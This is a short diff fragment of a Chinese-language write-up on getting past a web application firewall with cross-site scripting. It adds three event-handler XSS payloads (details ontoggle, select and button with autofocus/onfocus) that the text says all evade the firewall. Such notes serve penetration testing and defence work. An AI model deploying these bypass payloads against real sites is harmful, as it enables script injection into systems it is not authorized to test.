@@ -123,3 +123,10 @@ Waf拦截了，也很正常，常见一些标签`<svg>` `<img>`基本不考虑�
 成功弹窗。
 
 ![14](https://ws1.sinaimg.cn/large/005DAKuvgy1g20q4y8pftj30vn093751.jpg)
+
+下面给几个类似的，也都能绕过Waf
+```php
+<details open ontoggle=prompt(1)>
+<select autofocus onfocus=prompt(1)>
+<button onfocus=confirm(1) autofocus>
+```
